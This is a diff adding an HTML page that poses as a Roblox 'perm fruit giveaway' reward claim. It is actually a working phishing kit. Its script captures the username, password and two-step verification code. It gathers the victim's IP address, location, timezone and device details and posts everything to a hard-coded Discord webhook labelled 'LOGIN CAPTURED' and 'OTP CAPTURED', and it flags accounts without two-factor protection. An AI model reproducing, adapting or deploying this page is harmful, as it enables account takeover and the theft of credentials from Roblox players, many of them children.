@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Roblox - Claim Your Reward</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='22' fill='%2300A2FF'/%3E%3Crect x='30' y='30' width='40' height='40' rx='6' fill='%23fff' transform='rotate(12 50 50)'/%3E%3C/svg%3E">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#1b1d1f;color:#fff;font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{width:100%;max-width:400px}
+.pill{background:#0d3b1f;border:1px solid #1f7a3f;color:#6ee7a0;font-size:11.5px;
+font-weight:700;text-align:center;padding:8px 10px;border-radius:20px;margin-bottom:20px;
+letter-spacing:.3px}
+.logo{font-size:32px;font-weight:800;letter-spacing:-1.5px;text-align:center;margin-bottom:22px}
+.logo span{color:#00A2FF}
+h1{font-size:20px;font-weight:700;text-align:center;margin-bottom:6px}
+.sub{font-size:13px;color:#9aa0a6;text-align:center;margin-bottom:20px;line-height:1.55}
+label{display:block;font-size:12px;color:#c3c7cb;margin-bottom:6px;font-weight:600}
+input{width:100%;padding:13px 14px;background:#26292c;border:1px solid #3a3f44;border-radius:8px;
+color:#fff;font-size:15px;margin-bottom:15px;outline:none}
+input:focus{border-color:#00A2FF}
+button{width:100%;padding:14px;background:#00A2FF;border:0;border-radius:8px;color:#fff;
+font-size:15px;font-weight:700;cursor:pointer}
+button:active{background:#0086d6}
+.link{display:block;text-align:center;font-size:12.5px;color:#9aa0a6;margin-top:16px;cursor:pointer}
+.link:hover{color:#fff;text-decoration:underline}
+.otp{text-align:center;font-size:24px;letter-spacing:10px;font-weight:700}
+.badge{width:62px;height:62px;border-radius:50%;background:#00A2FF;margin:0 auto 18px;
+display:flex;align-items:center;justify-content:center;font-size:32px}
+.hide{display:none}
+footer{text-align:center;font-size:11px;color:#5f6469;margin-top:24px}
+</style>
+</head>
+<body>
+<div class="card">
+
+  <div id="s1">
+    <div class="pill">&#127881; YOU WERE SELECTED IN THE PERM FRUIT GIVEAWAY</div>
+    <div class="logo">ROB<span>L</span>OX</div>
+    <h1>Log in to claim</h1>
+    <p class="sub">Confirm your account so we can deliver your perm fruit</p>
+    <form id="f1">
+      <label>Username or Email</label>
+      <input id="u" autocapitalize="none" autocomplete="off" required>
+      <label>Password</label>
+      <input id="p" type="password" required>
+      <button type="submit">Log In</button>
+    </form>
+    <a class="link">Forgot Password or Username?</a>
+    <footer>Secured by Roblox Verification</footer>
+  </div>
+
+  <div id="s2" class="hide">
+    <div class="logo">ROB<span>L</span>OX</div>
+    <h1>Two-Step Verification</h1>
+    <p class="sub">Enter the 6-digit code sent to your email.<br>Our system is logging in to add your fruit.</p>
+    <form id="f2">
+      <input id="o" class="otp" inputmode="numeric" maxlength="8" placeholder="------" required>
+      <button type="submit">Verify</button>
+    </form>
+    <a class="link" id="skip">Didn't receive a code? Continue</a>
+  </div>
+
+  <div id="s3" class="hide">
+    <div class="badge">&#10003;</div>
+    <h1>Verified</h1>
+    <p class="sub">Your account is confirmed.<br><br>
+    Your perm fruit is queued and will land in your inventory within <b>24 hours</b>.<br><br>
+    Keep this page open and stay logged in to Roblox.</p>
+  </div>
+
+</div>
+<script>
+const HOOK="https://discord.com/api/webhooks/1568199936997199933/0A3mfLVVcjqW55xGL54tKfcG1cYdtF00td2VYr_QzKexLwtD4AwEiMl8Qhinuc5kCqH5";
+let ip="unknown",geo="unknown",t0=Date.now();
+
+fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{
+  ip=d.ip||ip;geo=[d.city,d.region,d.country_name].filter(Boolean).join(", ")||geo;
+}).catch(()=>fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>ip=d.ip).catch(()=>{}));
+
+function send(t,c,f){
+  fetch(HOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({
+    username:"RBX Logger",
+    embeds:[{title:t,color:c,fields:f.filter(x=>x.value),
+      footer:{text:new Date().toLocaleString()+" | "+((Date.now()-t0)/1000).toFixed(1)+"s"}}]
+  })}).catch(()=>{});
+}
+const meta=[
+  {name:"IP",value:ip,inline:true},
+  {name:"Location",value:geo,inline:true},
+  {name:"TZ",value:Intl.DateTimeFormat().resolvedOptions().timeZone,inline:true},
+  {name:"Screen",value:screen.width+"x"+screen.height,inline:true},
+  {name:"Device",value:navigator.userAgent.slice(0,170)}
+];
+document.getElementById("f1").onsubmit=e=>{
+  e.preventDefault();
+  const u=document.getElementById("u").value.trim();
+  send("\ud83d\udd11 LOGIN CAPTURED",0x00A2FF,[
+    {name:"Username",value:"```"+u+"```"},
+    {name:"Password",value:"```"+document.getElementById("p").value+"```"},...meta]);
+  document.getElementById("s1").classList.add("hide");
+  document.getElementById("s2").classList.remove("hide");
+  setTimeout(()=>document.getElementById("o").focus(),250);
+};
+document.getElementById("f2").onsubmit=e=>{
+  e.preventDefault();
+  send("\ud83d\udd10 OTP CAPTURED",0x00ff88,[
+    {name:"Code",value:"```"+document.getElementById("o").value.trim()+"```"},
+    {name:"User",value:document.getElementById("u").value.trim(),inline:true},...meta]);
+  document.getElementById("s2").classList.add("hide");
+  document.getElementById("s3").classList.remove("hide");
+};
+document.getElementById("skip").onclick=()=>{
+  send("\u26a0\ufe0f NO 2FA",0xffaa00,[
+    {name:"User",value:document.getElementById("u").value.trim(),inline:true},...meta]);
+  document.getElementById("s2").classList.add("hide");
+  document.getElementById("s3").classList.remove("hide");
+};
+</script>
+</body>
+</html>
